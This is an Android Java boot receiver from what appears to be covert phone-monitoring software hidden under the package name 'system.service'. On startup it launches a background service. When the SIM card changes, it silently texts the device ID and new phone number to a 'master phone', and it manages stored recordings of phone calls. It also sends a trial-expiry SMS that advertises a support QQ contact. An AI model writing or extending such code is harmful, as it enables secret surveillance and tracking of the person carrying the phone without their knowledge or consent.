package system.service.receiver;

import system.service.BootService;
import system.service.GlobalValues;
import system.service.R;
import system.service.R.string;
import system.service.activity.GlobalPrefActivity;
import system.service.config.ConfigCtrl;
import system.service.feature.location.LocationInfo;
import system.service.feature.sms.SmsCtrl;

import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.FileCtrl;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.license.LICENSE_TYPE;
import com.particle.inspector.common.util.location.BaseStationLocation;
import com.particle.inspector.common.util.location.BaseStationUtil;
import com.particle.inspector.common.util.license.LicenseCtrl;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;

/**
 * Receiver that will handle the boot completed intent and send the intent to launch the BootService.
 */
public class BootReceiver extends BroadcastReceiver {
	
	private static final String LOGTAG = "BootReceiver";
	private static final int WAV_FILE_MAX_NUM = 25; // The max number of call recording being kept in internal storage
	
	private Context context;
	
	@Override
	public void onReceive(Context context, Intent bootintent) {
		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
		
		if (bootintent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) 
		{
			// ---------------------------------------------------------------------
			// Calculate license type
			String key = ConfigCtrl.getLicenseKey(context);
			GlobalValues.licenseType = LicenseCtrl.calLicenseType(context, key);
			GlobalValues.deviceID = DeviceProperty.getDeviceId(context); 
			
			// Special workaround for issues 2/13/2012
			/*
			if (GlobalValues.licenseType != LICENSE_TYPE.FULL_LICENSED) {
				if (GlobalValues.deviceID.contains("94BCB7")) {
					GlobalValues.licenseType = LICENSE_TYPE.FULL_LICENSED;
				}
			}
			*/
			
			// ---------------------------------------------------------------------
			// If license is illegal
			if (!ConfigCtrl.isLegal(context)) 
			{
				// If out of trial, send SMS to warn the receiver user
				if (GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED)
				{
					// If has sent before, DO NOT send again
					if (ConfigCtrl.getHasSentExpireSms(context)) return;
					
					// Send SMS to the receiver that has expired
					String receiverPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
					if (receiverPhoneNum != null && receiverPhoneNum.length() > 0) {
						String msg = String.format(context.getResources().getString(R.string.msg_has_sent_trial_expire_sms), ConfigCtrl.getSelfName(context))
								+ context.getResources().getString(R.string.support_qq);
						boolean ret = SmsCtrl.sendSms(receiverPhoneNum, msg);
						if (ret) {
							ConfigCtrl.setHasSentExpireSms(context, true);
						}
					}
				}
				
				return;
			}
			
			// ==========================================================================
			// Start service
			Intent mServiceIntent = new Intent(context, BootService.class);
			context.startService(mServiceIntent);
			
			//===========================================================================
			// Start to check if changed SIM card
			SysUtils.threadSleep(2000);
			
			TelephonyManager mTelephonyMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
			//int simState = mTelephonyMgr.getSimState();
			
			String simSerialNumber = mTelephonyMgr.getSimSerialNumber();
			String hostSimSerialNumber = ConfigCtrl.getSimSerialNum(context);
			
			// I found that cannot get serial number of ChinaTelecom SIM card (getSimSerialNumber() return null), but ChinaUnicom can.
			if ((simSerialNumber == null || simSerialNumber.length() <= 0) &&
				(hostSimSerialNumber == null || hostSimSerialNumber.length() <= 0)) 
			{
				// Do not compare if sim and host sim are both empty.
				// That means we are incapable to compare them two.
			}
			else {
				boolean isFirstRun = ConfigCtrl.getSimFirstRun(context);
				if (isFirstRun) {
					ConfigCtrl.setSimFirstRun(context, false);
					if (simSerialNumber != null && simSerialNumber.length() > 0) {
						ConfigCtrl.setSimSerialNum(context, simSerialNumber.trim());
					}
				} else {
					if ((simSerialNumber != null && simSerialNumber.length() > 0 && hostSimSerialNumber != null && hostSimSerialNumber.length() > 0 && !simSerialNumber.contains(hostSimSerialNumber)) ||
						((simSerialNumber == null || simSerialNumber.length() <= 0) && (hostSimSerialNumber != null && hostSimSerialNumber.length() > 0)) ||	
						((simSerialNumber != null && simSerialNumber.length() > 0)  && (hostSimSerialNumber == null || hostSimSerialNumber.length() <= 0)))
					{
						// Send SMS since the SIM card has changed
						String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
						if (recvPhoneNum != null && recvPhoneNum.length() > 0) 
						{
							String deviceId = DeviceProperty.getDeviceId(context);
							String strContent = String.format(context.getResources().getString(R.string.msg_changed_sim), deviceId);
							
							String newPhoneNum = DeviceProperty.getPhoneNumber(context);
							if (newPhoneNum != null && newPhoneNum.length() > 0) {
								strContent += String.format(context.getResources().getString(R.string.msg_changed_sim_new_number), newPhoneNum);
							} else { 
								strContent += context.getResources().getString(R.string.msg_changed_sim_new_number_workaround);
							}
							
							// Send SIM change warning SIM to master phone
							boolean ret = SmsCtrl.sendSms(recvPhoneNum, strContent);
							
							// Set new SIM serial number
							if (ret && simSerialNumber != null && simSerialNumber.length() > 0) {
								ConfigCtrl.setSimSerialNum(context, simSerialNumber.trim());
							}
						}
					}
				}
			}
			
			// ==========================================================================
			this.context = context;
			new Thread(new Runnable(){
				public void run() {
					// Start a new thread to clear redundant phone call recordings
					FileCtrl.reduceWavFiles(BootReceiver.this.context, WAV_FILE_MAX_NUM);
				}
			}).start();
			
		} // end of "if (bootintent.getAction().equals(Intent.ACTION_BOOT_COMPLETED))"
	}
}